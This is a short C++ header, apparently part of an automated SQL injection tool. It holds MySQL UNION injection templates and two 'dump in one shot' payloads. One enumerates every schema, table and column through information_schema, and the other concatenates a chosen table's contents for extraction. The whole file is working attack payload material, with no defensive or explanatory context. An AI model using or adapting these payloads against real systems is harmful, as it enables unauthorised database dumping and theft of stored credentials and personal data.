//
// Created by zerte on 5/3/2020.
//

#ifndef XDG_UNION_H
#define XDG_UNION_H

#include <string>
#include <vector>

namespace Injection::MySQL::Union {
    const std::vector<std::string> _vectors {
        "%s UNION ALL SELECT %s %s",
        "%s UNION SELECT %s %s",
    };

    const std::vector<std::string> _dios {
        "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@) in (@:=concat(@,0x0D,0x%s,table_schema,0x%s,table_name,0x%s,column_name,0x%s))))a)", // Get Schema
        "(select (@) from (select(@:=0x00),(select (@) from (%s) where (@)in (@:=concat(@,0x0D,0x%s,%s,0x%s))))a)", // Dump
    };
};


#endif //XDG_UNION_H
